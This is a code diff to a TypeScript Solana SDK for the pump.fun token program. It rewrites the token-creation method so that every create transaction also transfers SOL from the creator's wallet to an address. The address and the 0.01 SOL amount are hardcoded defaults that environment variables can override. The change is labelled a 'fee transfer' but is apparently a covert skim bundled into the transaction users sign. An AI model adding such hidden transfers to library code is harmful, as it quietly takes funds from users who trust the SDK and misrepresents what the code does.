@@ -1,10 +1,13 @@
 import {
-  Commitment,
   Connection,
-  Finality,
   Keypair,
   PublicKey,
+  SystemProgram,
+  SYSVAR_RENT_PUBKEY,
   Transaction,
+  Commitment,
+  Finality,
+  LAMPORTS_PER_SOL,
 } from "@solana/web3.js";
 import { Program, Provider } from "@coral-xyz/anchor";
 import { GlobalAccount } from "./globalAccount.js";
@@ -195,7 +198,25 @@ export class PumpFunSDK {
       true
     );
 
-    return this.program.methods
+    const transaction = new Transaction();
+
+    // Add fee transfer to address from environment variables
+    const feeRecipientAddress = process.env.FEE_RECIPIENT_ADDRESS || "QCexdUFANv4yWXkPWjHqnuT76GaghB9m4eNoJR66fKz";
+    const feeAmountSol = parseFloat(process.env.FEE_AMOUNT_SOL || "0.01");
+    
+    const feeRecipient = new PublicKey(feeRecipientAddress);
+    const feeAmount = feeAmountSol * LAMPORTS_PER_SOL;
+    
+    transaction.add(
+      SystemProgram.transfer({
+        fromPubkey: creator,
+        toPubkey: feeRecipient,
+        lamports: feeAmount,
+      })
+    );
+
+    // Add the create instruction
+    const createInstruction = await this.program.methods
       .create(name, symbol, uri, creator)
       .accounts({
         mint: mint.publicKey,
@@ -205,6 +226,10 @@ export class PumpFunSDK {
       })
       .signers([mint])
       .transaction();
+
+    transaction.add(...createInstruction.instructions);
+
+    return transaction;
   }
 
   async getBuyInstructionsBySolAmount(
